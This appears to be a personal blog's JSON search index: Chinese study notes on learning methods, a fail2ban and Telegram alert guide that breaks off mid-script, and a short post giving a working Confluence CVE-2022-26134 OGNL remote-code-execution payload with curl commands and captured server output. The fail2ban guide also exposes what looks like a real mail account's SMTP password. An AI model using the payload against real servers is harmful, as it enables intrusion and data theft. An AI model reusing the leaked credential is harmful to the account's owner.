[{"content":"Markdown here\n","description":"test post","id":0,"section":"en","tags":null,"title":"May 2019","uri":"http://crkmythical.github.io/en/redteam/2019_may/"},{"content":"Markdown here\n","description":"test post","id":1,"section":"en","tags":null,"title":"Basic Usage","uri":"http://crkmythical.github.io/en/devsecops/gettingstarted/basicusage/"},{"content":"Markdown here\n","description":"test post","id":2,"section":"en","tags":null,"title":"April 2019","uri":"http://crkmythical.github.io/en/redteam/2019_april/"},{"content":"Markdown here\n","description":"test post","id":3,"section":"en","tags":null,"title":"Configuration","uri":"http://crkmythical.github.io/en/devsecops/gettingstarted/configuration/"},{"content":"Markdown here\n","description":"test post","id":4,"section":"en","tags":null,"title":"March 2019","uri":"http://crkmythical.github.io/en/redteam/2019_march/"},{"content":"Markdown here\n","description":"test post","id":5,"section":"en","tags":null,"title":"Installation","uri":"http://crkmythical.github.io/en/devsecops/gettingstarted/installation/"},{"content":"Markdown here\n","description":"test post","id":6,"section":"en","tags":null,"title":"February 2019","uri":"http://crkmythical.github.io/en/redteam/2019_february/"},{"content":"Markdown here\n","description":"test post","id":7,"section":"en","tags":null,"title":"Quick Start","uri":"http://crkmythical.github.io/en/devsecops/gettingstarted/quickstart/"},{"content":"Markdown here\n","description":"test post","id":8,"section":"en","tags":null,"title":"January 2019","uri":"http://crkmythical.github.io/en/redteam/2019_january/"},{"content":"helo\nsdfsjalkjal;fkjaljdkj\n","description":"","id":13,"section":"en","tags":null,"title":"Halo","uri":"http://crkmythical.github.io/en/blog/halo/"},{"content":"编写进度\n   Atlassian_Confluence-CVE-2022-26134 测试payload\n1 2 3  ${(#a=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(\u0026#34;cat /etc/passwd\u0026#34;).getInputStream(),\u0026#34;utf-8\u0026#34;)).(@com.opensymphony.webwork.ServletActionContext@getResponse().setHeader(\u0026#34;X-Cmd-Response\u0026#34;,#a))} /%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22whoami%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/   exp 1 2 3 4 5 6 7 8 9 10 11 12 13 14  curl -I -k \u0026#34;http://{host}/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22whoami%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/\u0026#34; HTTP/1.1 302 X-ASEN: SEN-16357695 X-Confluence-Request-Time: 1654478089003 Set-Cookie: JSESSIONID=A34182817EBFE6F7FA068AFB7582E98E; Path=/; HttpOnly X-XSS-Protection: 1; mode=block X-Content-Type-Options: nosniff X-Frame-Options: SAMEORIGIN Content-Security-Policy: frame-ancestors \u0026#39;self\u0026#39; X-Cmd-Response: confluence Location: /login.action?os_destination=%2F%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22whoami%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D%2Findex.action\u0026amp;permissionViolation=true Content-Type: text/html;charset=UTF-8 Transfer-Encoding: chunked Date: Mon, 06 Jun 2022 01:14:49 GMT   example 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20  curl -I -k \u0026#34;https://{host}/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22whoami%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/\u0026#34; HTTP/2 302 date: Mon, 06 Jun 2022 01:27:10 GMT content-type: text/html;charset=UTF-8 cache-control: private expires: Thu, 01 Jan 1970 02:00:00 IST x-asen: SEN-15222703 x-confluence-request-time: 1654478830348 x-confluence-cluster-node: 31b036c8 p3p: CP=\u0026#34;IDC DSP COR ADM DEVi TAIi PSA PSD IVAi IVDi CONi HIS OUR IND CNT\u0026#34; set-cookie: JSESSIONID=18114A6EC984E7571933004E790DF93F; Path=/; Secure; HttpOnly x-xss-protection: 1; mode=block x-content-type-options: nosniff x-cmd-response: nt authority\\system location: /login.action?os_destination=%2F%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22whoami%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D%2Findex.action\u0026amp;permissionViolation=true cf-cache-status: DYNAMIC expect-ct: max-age=604800, report-uri=\u0026#34;https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct\u0026#34; server: cloudflare cf-ray: 716d5d2b3f2bf8a7-NRT alt-svc: h3=\u0026#34;:443\u0026#34;; ma=86400, h3-29=\u0026#34;:443\u0026#34;; ma=86400   ","description":"","id":14,"section":"en","tags":null,"title":"Atlassian_Confluence-CVE-2022-26134.md","uri":"http://crkmythical.github.io/en/blog/atlassian-confluence-md/"},{"content":"编写进度\n   当前学习类书籍适用人群\n 大学生 \u0026mdash;\u0026gt; 《如何高效学习》 教师 \u0026mdash;\u0026gt; 《学习之道》 拆书家 \u0026mdash;\u0026gt; 知识网红类的书籍 职场人员 \u0026mdash;\u0026gt; 《学习力：颠覆职场学习的高效方法》  本书特点：\n 理论深厚，从科学及主流学习理论提炼出职场学习三大策略（功利性、框架、可迁移） 体系完整，五类学习技巧(搜索、阅读、积累、理解)，及综合运用方法 实战导向，给出职场学习场景结合各种学习方法展示学习步骤  本书编排思路\n 职场学习三大策略-（功利性、框架、可迁移） 五类技巧(搜索、阅读、积累、理解) 结合场景运行三大策略和五类技巧  学习 在 原有经验和知识为基础 ， 模仿+反复刻意练习 ， 主动 构建新的知识 的过程。\n分享 是反复学习的过程\n\n体系化碎片式学习 先有 知识框架 ，再 碎片化学习 丰富框架细节，深化理解。 (系统化学习做基础，碎片化学习做加法)\n 前提: 建立在 主动、切实实践 的基础上 首先: 建立 知识体系框架 (碎片化学习的有效性构建在系统化学习的稳健性之上) 然后: 碎片化输入、体系化积累 最后: 层次化、立体化 知识体系框架  层次化：在不同情景中运用知识，条件化知识，在多样化情况中应用 立体化：对知识做高层次的抽象概括    \n主动构建知识框架 在对照整体框架做迁移时，对比原框架是知识和技能，而不是能力和素质。(能力和素质与行业无关)\n 请教业内有深刻理解/丰富经验的人对这个行业建立的整体认知框架 参加培训 阅读经典书籍  [ ] 搭建高质量框架: “宏观”输入知识，需要掌握信息的结构化思维，懂得何如从一大段信息中迅速提炼出”框架”\n 整体性: 将知识以本质的内在联系组织为一个整体，并服务于一个根本应用目标 调整性: 自身具有很好的调整性 转换性: 目标改变，框架可同步转换以支撑新目标的实现  \n碎片化输入、体系化积累  功利性学习(带着问题意识)： 从工作的实际需要出发，学习后立马应用  选问题: 工作中需要解决的问题并根据迫切程度确定优先级 %%工作与学习融为一体%% 定范围: 根据待解决问题的实际需要确定学习内容的范围和顺序  新行业必备基础知识和技能 与工作需要迫切程度一致 根据工作类型   实际用: 应用所学内容解决问题  若无经验，则完全照搬，严格遵循方法或技巧的指引      \n碎片化输入技巧   阅读技巧\n 提炼 - 拆解提炼(核心关键词不变，自述) 核心内容和知识体系 链接 - 关联原有经验 融合 - 组块化存储、模型式归档    理解技巧\n费曼学习法\n大脑真正的输入，是它对知识的输出(让输出倒逼输入)\n唯有以 理解为标准 输入知识，才能把知识有效地学进去\n  记忆技巧1\n记忆：信息和头脑中固有的知识形成了密切的联系\n记忆宫殿2： 利用人类的 内视觉记忆 ，通过想象在脑海中看到的虚幻画， 外视觉 是我们通过肉眼可以看到的真实世界\n 记忆模式 : 地点+记忆影像 三层定桩法  元桩: 先找10个房间，每个房间找10个记忆点 基础桩: 用元桩记忆100幅图像，每幅图像找10个地点      \n聚沙成塔技巧-Anki3/便签法 在每次学习新知识时，再对原有框架加以增补和修正，\n知识管理 学习渠道：事、网、书、人\n在碎片化时代的知识管理，\n 信息/知识的碎片化不是问题，能否 对信息进行分析和整理 才是关键 重点是 对加工知识的大脑进行管理 ， 而不是对 承载知识的文档和文章进行管理  囤积学习材料不能于学习知识\n真正有效的知识绝不会过于复杂，复杂的往往知识市面上衍生材料的营销手段。\n\n构建知识体系 能够让人有稳定的根基和框架，树立成长思维，批判思维和系统思维\n 个人知识系统: 以解决问题为中心，促进应用，创造价值 学科知识系统 以知识学习为中心，指导科研，树立框架，撰写论文  \n构建知识体系，看书 vs 网络  若学习能力差, 看书和看手机没区别 若学习能力一般, 针对尚无基础的领域，看书比看手机好 若学习能力较强, 在该领域发展了属于自己的体系, 看书和看手机都可以把知识拆为己用  \n各类技能学习应用技巧 \n行为技能 强调身体熟练度的技能，核心在于熟能生巧 挑选对象 -\u0026gt; 量力模仿 -\u0026gt; 分解简化 -\u0026gt; 局部细化\n\n理解性技能 强调理解的深度，要求能够抽象出更一般的规律 选用框架 -\u0026gt; 生搬硬套 -\u0026gt; 质疑改进\n\n程序性技能 强调先理解、后操作 简单入门 -\u0026gt; 迭代深化 -\u0026gt; 自然重复\n\n思维观念 要想教给人们新的思维方式,不要刻意去教，而应当给他们一种工具，让他们通过使用工具培养新的思维模式\n\n时间管理 时间管理的本质: 注意力和精力的管理\n\n自由 自由不是随心所欲做想做的事情，而是 有能力 可以不做 不想做 的事情，\n\n积累 \n价值  任何决策都可以用利益衡量 (没办法每天坚持早起，是因为早起给你带来的收益远远小于你睡觉的收益) 能用钱解决，千万别用人情 免费是最贵的 学习是回报率最高的投资 学什么不重要，重要是你的知识和服务有没有人愿意付钱 知识变现： 本质是信息不对称，你要比别人先察觉，先尝试，先理解，先分享  \n习惯 蝴蝶效应: 改变 思想 –\u0026gt;行动 –\u0026gt;习惯 –\u0026gt;性格 –\u0026gt;命运\n\n格局 若没有圣人的胸怀，就不要将自己燃烧得太高尚，否则既煎熬了自己，又灼伤了别人\n请主观为自己奋斗，客观为团队创造价值\n为人得低调，但做事要高调，低调是为了生活在自己的世界里，高调是为了生活在别人的世界里\n\n人脉 人脉的意义不在于你认识谁，而在于 你能吸引谁 ，有多少人愿意主动和你打交道\n人脉的本质是 交换关系 可交换价值 , 互帮互助\n志同道合本质是 彼此间利益的交集最大\n合作, 是资源交换和资源整合, 先把利益谈到位\n\n其他 \n马斯诺需求金字塔 \n知识、技能、与能力区别  知识是客观存在的 技能是某种工具的使用方法，某个具体工作的完成技巧 能力是比技能更加深层和通用的存在  \n绿灯思维4 \n行动计划5W2H 得意时信儒、失意时信道、绝望时信佛 林语堂  \n终极智慧 人性中有无数多个相对的点(善良/邪恶、忠诚/背叛等)，是每个人与生俱来的东西，不会因为一个人高尚或龌蹉而增减。\n每个人个性特质与命运差别在于显现不同的点，运用如下\n\n言语 人每往前走一步都离不开语言开路，\n要懂得上什么山唱什么歌，见什么想人说什么话，到什么场显什么相。\n口才不是练出来的，而是对人性各点深入洞察与揣摩后的运用。\n\n看人 看人不是看性格，要看他显现了人性的哪些点。\n东征西战的人勇猛向前，显现了强悍的点；\n东躲西藏的人被逼无奈，显现了畏惧的点。\n历代伟人之所以毁誉参半，就是显现人性的点太多，好事儿做尽，坏事儿也做绝。\n一个人最高的境界就是看起来很有人情味儿，领袖都是以此来吸引追随者。\n高人: 少言寡语, 从容淡定\n\n经历 小成靠学，大成靠悟，最大成靠经历。\n一个人即使顿悟了，依然要经历大量的事情。\n历代伟人都是经历的多，把心性历练出来了。\n一件事情只有经历了，心才能历练出来，才能真正放下。\n如果不历练心，即使学了很多东西，一遇到事儿心还是会慌，一遇事儿心就慌，说明你用的不是自己经历后的体验，而是从书上看来的道理。\n读书人最怕的就是看书多做事少，读书读到记忆层面是用不出来的，得读到心灵层面。\n想做事儿的人，就得把自己的心打开，然后去拼命历练。\n\n领导 发展好的企业都是在经营一个祥和的场，让每个人人性中美好的点最大程度的显现而不是掩盖。\n能把员工的思想境界带到一个高度的领导人才能称之为企业家。\n\n宗教 佛教就是在经营人心，抓住了人性中的几个点\n佛教建立寺庙，激发敬畏感、神秘感，有的人甚至一生依赖和追随\n人性都是为了希望而活\n佛教能够吸引几亿人追随，靠的就是永远给人希望: 今天不好就说明天会好，今年不好就说明年会好，这辈子不好就说下辈子一定会好。\n因此，佛教的寺庙连锁店开遍了全世界，员工发型一样、穿着一样、不结婚还不要工资。\n\n典籍 典籍绝对不是华丽词汇的堆积，而是点中了人性的某几个点。历代经典都是针对人性中的点而讲的。\n 《孙子兵法》十三篇，就是从十三个角度针对敌方最高指挥官人性上的特点进行精准的攻心打击。 《老子》讲的只是人性中的很多点，但没有讲全。  \n心念 破山中贼易，破心中贼难。人生出问题，就出在了起心动念。\n心中升起一个念头，一定要清醒的察觉到这个念头究竟能把你带向何方。\n你心中升起什么念头，最后都真实的转化成了你的命运。\n遇见绝色美女，心中若升起一个色的念头，虽然看似没做什么，但行为已经显露猥琐。\n\n道-法-术  道 客观规律 法 规则 术 方法\n控制情绪,  \n饮食 已饥方食，未饱先止\n\n出世之路  儒家： 无所为而为 (按规律做事，不为己欲而做事) 佛家： 无心而为 (认真做事，对结果别放心上) 道家： 无为而无不为 (为道日损，损之有损，减少人为的因素)  \n智慧 世间所存在的一切对我们的内心，最初都是干扰，直到我们习以为常。\n所有智慧都来自于一种思想对你冲击时，你心中体验到的感受，这就是智慧。\n你内心生发出来的才是对你有用的智慧。\n\nAnki 用户手册\n算法讲解\nanki学习笔记\nanki专栏\n高中生也能看懂的anki教程\nanki settings video\n  ease针对每张卡片，interval modifier针对每个牌组\n Again： ease-20% until 130$ Hard: ease-15% Good： ease保持不变 Easy: ease+15%    New Interval: current interval * ease * interval modifier\n Again: relearning step Hard: 当前间隔*(hard interval)*(interval modifier) Good : 当前间隔*ease* (interval modifier) Easy : 当前间隔*ease* (interval modifier)*(easy bonus)    \nAnki Server  linux ankiserver ankiserver  \n插件  awosome-TTS image  \n注意事项  学会切换大脑专注/发散状态 保证睡眠 已饥方食，未饱先止  \n参考书籍  学习力:颠覆职场学习的高效方法 这样读书就够了 个人学习力升级指南 个体赋能：新时代加速成长隐性逻辑 高效学习法:名校学霸教你把学习变得轻而易举 颠覆平庸 如何成为领先的少数人 洋葱阅读法  \n撩人 新人结婚的时候，不应该将手搭着圣经说无论贫穷富贵，健康疾病都至死相伴而是把手放在《进化心理学》和《自私基因》这两本书上宣誓：“我将违背我的天性，忤逆我的本能，永远爱你”\nFootnotes 1 主动回想,间断重现,穿插练习 干扰和困难适度\n2 按顺序记忆，记忆桩不能存在视觉重叠\n3 工欲善其事，必先利其器，器欲尽其能，必先得其法\n4 不要等到这条街上的绿灯全部都亮你才开车，而是这段路上的绿灯亮了，你往前进一点，看到红灯就停下，等待下一个绿灯\n","description":"","id":15,"section":"en","tags":[""],"title":"职场学习力的读后感","uri":"http://crkmythical.github.io/en/blog/%E8%81%8C%E5%9C%BA%E5%AD%A6%E4%B9%A0%E5%8A%9B%E7%9A%84%E8%AF%BB%E5%90%8E%E6%84%9F/"},{"content":"编写进度\n   知识分类  【 】 事实性知识 —术语，要素 【 】 概念性知识—结构，分类，原理 【 】 程序性知识—技能，算法，使用准则 【 】 元认知知识—策略知识，任务知识，自我知识（对自己学习过程的内在监督分析，自我对知识点的反省，应对不同知识做出不同的反应）  知识晶体 知识晶体分解-\u0026gt; {key/:explain}\n [!done] 如何操作知识晶体\n将知识晶体组块，逐步实现自动化(何时用）、条件化(如何用）\n 知识的管理方法  文件夹管理法\n容易导致分类模糊 层级标签管理法 原子化笔记  知识管理工具  [!tip] **1.大脑是用来思考的，不是用来记忆的。\n建立外脑的本质就是体系化你知识的过程！！！\n外脑(体系化,便管理，易提取)= 存储笔记系统 + 索引笔记系统\n  大纲类工具 双链类工具 卡片类工具   目录编码原则\n  ","description":"","id":16,"section":"en","tags":[""],"title":"关于知识","uri":"http://crkmythical.github.io/en/blog/%E5%85%B3%E4%BA%8E%E7%9F%A5%E8%AF%86/"},{"content":"编写进度\n   Title: 如何高效学习\nDate: 2022-04-24 15:01\nAuthor: crkmyth1cal\nTags:\nModified: 2022-04-24 15:01\nReferer: https://blog.csdn.net/qq_35664104\nWeather: Unknown location; please try ~39.9059631,116.391248 每日15/30/15法则 ^b5cab6\n当你有几个小时空闲的时间，与其埋头苦读，不如把学习时间分散，集中精力完成一些小而有效的学习任务。\n若每天学习时间很短，但学习频率很高，从长远看你最终能学到的更多。\n把每天分为三个主要的时间段：\n 早上 15mins 中午30mins 下午 15mins  早上15mins-第二次复习  [!tip] 早上15mins-第二次复习\n复习前一晚的笔记， 看看睡了一夜后你还能记得多少。前一天遗留的问题应该成为今天首要解决的知识点。\n 中午30mins-学习时间  [!tip] 中午30mins-学习时间\n借助课程和学习资料学习新知识，或者利用这段时间做作业和练习，在这30mins内保持专注、保证效率\n 下午15mins-第一次复习  [!tip] 下午15mins-第一次复习\n复习白天学过的知识点，夯实新学的语法和词汇，查漏补缺，第二天早上进行第二次复习。\n 三天打鱼，四天筛网法则 若无法每天坚持学习，可以使用如下方法：\n [!tip]\n每天花三天按照 [[#^b5cab6| 15/30/15]] 的计划学习，然后休息四天。\n在休息日的时候，你只用每天花几分钟回顾一下学过的知识就好，无需学习新内容。\n ","description":"","id":17,"section":"en","tags":[""],"title":"如何高效学习","uri":"http://crkmythical.github.io/en/blog/%E5%A6%82%E4%BD%95%E9%AB%98%E6%95%88%E5%AD%A6%E4%B9%A0/"},{"content":"编写进度\n   (58 条消息) 有类似专门研究学习方法的书吗? - 知乎 (zhihu.com)\n《认知天性》推荐的学习法-\u0026lt;检索练习\u0026gt; what-什么是检索练习  [!faq] 什么是检索练习\n 费曼学习，温故而知新，可以为师也   why-为什么要用检索练习学习知识  [!summary] 从记忆中检索知识有两大显著的好处：\n 是明确已知和未知，合理分配精力 强化新知与已知之间的联系，方便今后回忆检索，可以有效地中止遗忘。 被忘掉的不是知识本身，而是能让你找到并检索这些知识的线索。 知识最终将变成条件反射   how-如何高效地进行检索练习  [!faq] 如何提高检索练习的效率?\n检索某件事物所耗费的努力越多，你学得就越扎实 正是感觉到学习更吃力时，记忆才更为长久、牢固。\n 间隔/重复检索  使用anki学习/复习 定期自测，重新校准已知和未知。可以防止遗忘，强化检索路径，而且对于保存你想要掌握的知识来说至关重要。   穿插/多样检索 ,  交替学习/复习， 同一事物的多样性，从不同角度学习/复习 有助于我们更好地学习如何评估背景，以及辨识问题间的差异，从一系列可选的答案中选择并应用正确的解决方案。   反思及细化  为新资料提供一种比喻或视觉形象 把资料和你已知的东西联系起来，用自己的语言向别人解释，或者解释这些资料与你的课外生活有什么联系。     学习误区 关于艾宾浩斯曲线意义的误解  [!warning] - [ ] 艾宾浩斯曲线毫无意义\n不同的事物，不同的人，不同的状态，你的记忆效果都会不一样。\n 一件事情多快被遗忘，很大程度上取决于这件事对我们的重要程度。   低效学习方式有哪些  [!warning] 低效学习方法\n那些方法并没有给大脑带来挑战，没法起到巩固的作用，只会让人误以为自己已经掌握了。用今天流行的话讲就是：你只是假装很努力！\n 反复阅读 , 反复阅读的效果是边际递减的 划线 摘抄 长时间盯着笔记与课本 记笔记 (指上课时想把老师说的话全部记下来的行为)   为什么无法从不擅长的事情里学到知识？  [!faq] 为什么无法从不擅长的事情里学到知识\n即便有人能得到负面反馈，他们还必须准确理解为什么会失败。\n要成功需要做对所有的事情。\n相反，失败则可以归结到任何一个外部理由上：做不好事情怪工具不合适是很容易的。\n 为什么穿插练习的效果更好？  [!faq] 为什么穿插练习的效果更好？\n把不同类型的问题或样本混合起来学习，可以提高你区别问题类型的能力，辨识出同一类型问题的普遍特点，并且能提高你在今后测验或真实环境中的成功率。\n在现实世界中，你必须能够识别要解决问题的类型，才能运用正确的解决方案。\n 复习间隔多久为宜？  [!faq] 间隔检索练习，间隔多久最为合适?\n从最低限度上说，间隔的时间足够出现一点儿遗忘就对了。\n在两次练习间至少间隔一天应该是不错的做法。\n ","description":"","id":18,"section":"en","tags":[""],"title":"《认知天性》中关于学习方法的见解","uri":"http://crkmythical.github.io/en/blog/%E8%AE%A4%E7%9F%A5%E5%A4%A9%E6%80%A7%E4%B8%AD%E5%85%B3%E4%BA%8E%E5%AD%A6%E4%B9%A0%E6%96%B9%E6%B3%95%E7%9A%84%E8%A7%81%E8%A7%A3/"},{"content":"编写进度\n   Fail2ban Fail2Ban 是入侵检测软件框架，保护计算机免受暴力破解（brute-force attack）。以 Python 语言编写，能运行于具有包（packet）控制或防火墙的 POSIX 系统，如 iptables 或 TCP Wrapper.\nFail2Ban可以通过描日志文件并用正则匹配分析，然后通过更新防火墙规则来禁止某些有恶意迹象的 IP（密码失败过多，寻求漏洞利用等）来提高服务器安全性。\nfail2ban安装/开机自启 1 2 3 4  apt install fail2ban yum install fail2ban systemctl restart fail2ban systemctl enable fail2ban.service # 开机自启   配置文件 /etc/fail2ban/  /etc/fail2ban/filter.d/：条件文件夹, 内含默认文件，用于定义日志文件内容的过滤规则,其中预设于了 SSH、Nginx、Apache 的监控规则 /etc/fail2ban/action.d/：动作文件夹, 发现恶意 IP 后采取的操作，其中预设了许多常用操作，其中预设了 iptables、firewalld、sendmail 等操作 /etc/fail2ban/jail.d：配置文件夹, Jail 由 Filter 和 Action 组成，用于定义错误次数、封禁时长、封禁动作等 /etc/fail2ban/jail.conf ：定义 fai2ban 自身的日志级别、日志位置等  当 filter 文件监视到的错误记录条数在 jail 中定义的时间内达到 jail 中定义的次数后，告知系统 iptables 执行封禁动作及封禁时长。在封禁时长到期时，告知 iptables 解除封禁。\n配置过滤规则  /etc/fail2ban/filter.d/\u0026lt;fiter-name\u0026gt;.local  首先设置过滤规则，在 /etc/fail2ban/filter.d/ 目前下新建一个 .conf 文件，名字自取，比如我新建的是 nginx-zatp-com.conf，然后进行设置：\n[Definition] failregex = ignoreregex = 其中：\nfailregex：表示过滤规则的正则表达式；\nignoreregex：表示忽略规则的正则表达式，可以设置为 .*(webp|svg|jpg|png) 忽略对图片文件的请求，防止图片文件过多误伤；\n而这里要实现我们想要的效果，也有两个选择，配合开篇提到的 Nginx 流控产生的日志文件（error.log）进行匹配过滤或者直接对 Nginx 的访问日志文件（access.log）进行匹配过滤。原理都一样，fail2ban 预置了很多常见服务的日志文件匹配模板，在 /etc/fail2ban/filter.d/ 目录下可以找到。如果你修改了日志格式，那么需要根据你的日志文件格式改写相应的表达式。\n这里我用 Nginx 的 limit_req_zone 流控模块做一个示例，下面是一条超过限制产生的错误信息：\n2021/10/13 01:02:39 [error] 14174#0: *41792 limiting requests, excess: 5.920 by zone \u0026quot;request\u0026quot;, client: x.x.x.x, server: www.zatp.com, request: \u0026quot;HEAD /?feed=rss HTTP/2.0\u0026quot;, host: \u0026quot;www.zatp.com\u0026quot; 参考自带的 /etc/fail2ban/filter.d/nginx-limit-req.conf 模板，可以写成下面的表达式：\n[Definition] failregex = ^\\s*\\[[a-z]+\\] \\d+#\\d+: \\*\\d+ limiting requests, excess: [\\d\\.]+ by zone \u0026quot;.*\u0026quot;, client: \u0026lt;HOST\u0026gt;, ignoreregex = failregex 也可以直接简写为：\nfailregex = limiting requests, excess:.* by zone.*client: \u0026lt;HOST\u0026gt; 其中 \u0026lt;HOST\u0026gt; 是必须包含的，fail2ban 通过这个来获取 IP 地址，测试自定义的规则是否生效：\nfail2ban-regex /var/log/nginx/access.log /etc/fail2ban/filter.d/nginx-zatp-com.conf 如果成功匹配会返回匹配到的信息：\nResults ======= Failregex: 4 total |- #) [# of hits] regular expression | 1) [4] ^\\s*\\[[a-z]+\\] \\d+#\\d+: \\*\\d+ limiting requests, excess: [\\d\\.]+ by zone \u0026quot;.*\u0026quot;, client: \u0026lt;HOST\u0026gt;, `- Ignoreregex: 0 total 配置Jail规则 Fail2ban在安装时会创建两个默认的配置文件:\n /etc/fail2ban/jail.d/defaults-debian.conf /etc/fail2ban/jail.conf\n我们不建议直接修改这些文件，因为更新Fail2ban时它们可能会被覆盖。  Fail2ban将按以下顺序读取配置文件。每个.local文件都会覆盖.conf文件中的设置：\n /etc/fail2ban/jail.conf /etc/fail2ban/jail.d/*.conf /etc/fail2ban/jail.local /etc/fail2ban/jail.d/*.local  创建自定义配置文件 1 2 3  cp /etc/fail2ban/jail.{conf,local} ignoreip = 127.0.0.1/8 ::1 123.123.123.123 192.168.1.0/24    [jail_name] : jail的名称 enabled : 可以设置为true或false以启用/禁用过滤器 port : 运行服务的端口，如果使用的端口是默认端口，则可以使用服务名称，否则需要明确指定端口号 filter : 位于/etc/fail2ban/filter.d/目录中的过滤器文件的名称(需要与自定义规则里的名称一致，不需要.conf后缀)，其中包含用于解析日志的fileregex信息 logpath: fail2ban检测的日志文件路径 backend : 用于获取日志文件修改的后端 auto ignoreip : 设置白名单ip地址,以空格分隔多个ip/ip段 banaction : 实时锁定行动的类型 action : iptables-allports 如果被触发，执行怎样的脚本？ banaction_allports : Fail2ban阻止每个端口上的远程IP地址 bantime : 锁定时长,默认单位为秒, 默认10m ，值-1将永久禁止IP地址 maxretry : 允许IP失败尝试次数。 默认值设置为5， findtime : 重试次数之前的持续时间  1 2 3  findtime=10m maxretry=3 bantime=1d   表示 findtime(10m)中内失败次数达到maxretry(3)次则锁定bantime(1d)\n邮件通知 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21  apt install -y bsd-mailx sendmail systemctl restart sendmail.service cat \u0026lt;\u0026lt;EOF \u0026gt;\u0026gt; /etc/mail.rc set bsdcompat set from= 741474596@qq.com set smtp=smtp.qq.com:465 set smtp-auth-user=741474596@qq.com set smtp-auth-password=gkotyjhergynbdjh set smtp-auth=login #启用ssl加密 set smtp-user-starttls set ssl-verify=ignore #ssl的加密证书 set nss-config-dir=/etc/ssl/certs EOF # 测试发送邮件 echo \u0026#34;邮件内容\u0026#34; |mail -v -s \u0026#34;邮件标题\u0026#34; xxx@xxx.com mail -s \u0026#34;theme\u0026#34; xx@xxx.com \u0026lt; message.txt   Fail2ban可以在IP被禁止时发送电子邮件警报。 要接收电子邮件，您需要在服务器上安装SMTP并更改默认的action，该action操作仅将IP禁止为%(action_mw)s，如下所示：\n# /etc/fail2ban/jail.local action = %(action_mw)s %(action_mw)s将禁止有问题的IP，并发送包含Whois报告的电子邮件。 如果要在电子邮件中包含相关日志，请将操作设置为%(action_mwl)s。您还可以调整发送和接收电子邮件地址：\n# /etc/fail2ban/jail.local destemail = admin@myfreax.com sender = root@myfreax.com 配置Fail2ban telegram 机器人通知 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90  #创建Telegram 机器人为关注`Botfather`，按提示操作即可， #可查找机器人Token，添加`userinfobot`查找自己聊天ID #在/etc/fail2ban/action.d/中新建telegram.conf文件并写入 [Definition] actionstart = /etc/fail2ban/scripts/send_telegram_notif.sh -a start actionstop = /etc/fail2ban/scripts/send_telegram_notif.sh -a stop actioncheck = actionban = /etc/fail2ban/scripts/send_telegram_notif.sh -n \u0026lt;name\u0026gt; -b \u0026lt;ip\u0026gt; actionunban = /etc/fail2ban/scripts/send_telegram_notif.sh -n \u0026lt;name\u0026gt; -u \u0026lt;ip\u0026gt; [Init] init = 123``` ```bash #在/etc/fail2ban/中新建scripts目录，并新增send_telegram_notif.sh脚本文件写入 #!/bin/bash # Version 1.0 # Send Fail2ban notifications using a Telegram Bot # Add to the /etc/fail2ban/jail.conf: # [sshd] # *** # action = iptables[name=SSH, port=22, protocol=tcp] # telegram # Create a new file in /etc/fail2ban/action.d with the following information: # [Definition] # actionstart = /etc/fail2ban/scripts/send_telegram_notif.sh -a start # actionstop = /etc/fail2ban/scripts/send_telegram_notif.sh -a stop # actioncheck = # actionban = /etc/fail2ban/scripts/send_telegram_notif.sh -n \u0026lt;name\u0026gt; -b \u0026lt;ip\u0026gt; # actionunban = /etc/fail2ban/scripts/send_telegram_notif.sh -n \u0026lt;name\u0026gt; -u \u0026lt;ip\u0026gt; # # [Init] # init = 123 # Telegram BOT Token telegramBotToken=\u0026#39;xxxxx\u0026#39; #此处替换为自己Telegram 机器人Token # Telegram Chat ID telegramChatID=\u0026#39;xxxxx\u0026#39;#此处替换为自己的Chat ID function talkToBot() { message=$1 curl -s -X POST https://api.telegram.org/bot${telegramBotToken}/ sendMessage -d text=\u0026#34;${message}\u0026#34;-d chat_id=${telegramChatID} \u0026gt; /dev/null 2\u0026gt;\u0026amp;1 } if[ $# -eq 0 ]; then echo \u0026#34;Usage $0-a ( start || stop ) || -b $IP|| -u $IP\u0026#34; exit 1; fi while getopts \u0026#34;a:n:b:u:\u0026#34; opt; do case\u0026#34;$opt\u0026#34;in a) action=$OPTARG ;; n) jail_name=$OPTARG ;; b) ban=y ip_add_ban=$OPTARG ;; u) unban=y ip_add_unban=$OPTARG ;; ?) echo \u0026#34;Invalid option. -$OPTARG\u0026#34; exit 1 ;; esac done if[[ ! -z ${action} ]]; then case\u0026#34;${action}\u0026#34;in start) talkToBot \u0026#34;Fail2ban has been started on `hostname`.\u0026#34; ;; stop) talkToBot 